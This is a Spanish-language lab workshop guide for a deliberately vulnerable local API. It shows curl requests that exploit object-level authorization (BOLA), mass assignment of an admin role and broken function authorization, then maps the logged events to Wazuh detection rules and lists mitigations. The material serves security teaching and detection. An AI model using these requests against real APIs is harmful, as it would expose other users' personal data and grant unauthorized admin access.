# Taller: Ataque y deteccion en APIs

Este taller guia una practica completa: explotar fallas comunes en una API vulnerable, generar eventos reales y revisar la evidencia defensiva que queda para Wazuh.

Tambien puedes usar la API sin seguir el taller. Para explorar libremente, abre la guia general de [API Vulnerable](../services/api.md) y prueba tus propios requests.

## Requisitos

- Servicio `opsn-api` iniciado.
- Servicio `opsn-docs` iniciado para leer esta guia dentro del lab.
- Recomendado para deteccion: `opsn-wazuh` y `opsn-suricata`.
- Terminal con `curl`.
- Puerto API por defecto: `8025`.

## Objetivos

Al terminar, debes poder explicar:

- Que es BOLA y como aparece en una API vulnerable.
- Como un mass assignment cambia campos que el usuario no deberia controlar.
- Como un endpoint administrativo puede fallar por autorizacion de funcion.
- Que eventos JSON genera la API.
- Que reglas de Wazuh se relacionan con esos eventos.
- Que mitigaciones reducen el riesgo.

## 1. Confirmar que la API responde

```bash
curl -s http://localhost:8025/api/health
```

Salida esperada:

```json
{"service":"opsn-api","status":"ok"}
```

## 2. Iniciar sesion como alice

```bash
curl -s -X POST http://localhost:8025/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}'
```

Salida esperada:

```json
{"note":"Este token nunca expira -- API2:2023 Broken Authentication","token":"token_alice"}
```

Usa este token en los siguientes pasos:

```bash
TOKEN="token_alice"
```

## 3. Disparar BOLA

Alice consulta el perfil de Bob:

```bash
curl -s http://localhost:8025/api/users/2/profile \
  -H "Authorization: Bearer ${TOKEN}"
```

Observacion esperada:

- La API responde con datos de Bob.
- La respuesta incluye campos sensibles como `credit_card`, `ssn` y `salary`.
- La API escribe un evento `bola_attempt`.

## 4. Disparar mass assignment

Alice actualiza su perfil y cambia el campo `role`:

```bash
curl -s -X PUT http://localhost:8025/api/users/1/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"email":"alice+lab@opensec.lab","role":"admin"}'
```

Observacion esperada:

- La API acepta el cambio.
- La respuesta muestra `role` modificado.
- La API escribe un evento `mass_assignment_attempt`.

## 5. Disparar broken function authorization

Alice llama un endpoint administrativo:

```bash
curl -s http://localhost:8025/api/admin/users \
  -H "Authorization: Bearer ${TOKEN}"
```

Observacion esperada:

- La API devuelve la lista de usuarios.
- La API escribe un evento `broken_function_auth`.

## 6. Revisar eventos de la API

Si tienes acceso al host Docker, revisa el log compartido:

```bash
docker exec opsn-api sh -lc 'tail -n 20 /logs/api.log'
```

Eventos esperados:

```text
bola_attempt
mass_assignment_attempt
broken_function_auth
```

## 7. Relacionar eventos con Wazuh

Las reglas del lab usan estos eventos:

| Evento API | Regla Wazuh | Significado |
| --- | --- | --- |
| `bola_attempt` | `100061` | Un usuario accedio a recursos de otro usuario. |
| `mass_assignment_attempt` | `100063` | El request intento modificar campos protegidos. |
| `broken_function_auth` | `100064` | Un usuario no administrador llamo un endpoint administrativo. |

En Wazuh Dashboard busca eventos recientes con:

```text
rule.groups: openseclab_api
```

Si Wazuh sigue iniciando, espera unos minutos y repite la busqueda.

## Mitigaciones

- Validar autorizacion por objeto en cada request.
- No devolver campos sensibles por defecto.
- Usar allowlists de campos actualizables.
- Separar autenticacion de autorizacion.
- Rechazar endpoints administrativos para usuarios sin rol permitido.
- Registrar eventos con suficiente contexto para investigacion.

## Reset rapido

La API usa datos en memoria. Para volver al estado inicial:

```bash
docker restart opsn-api
```

Si tambien quieres limpiar eventos previos:

```bash
docker exec opsn-api sh -lc ': > /logs/api.log'
```
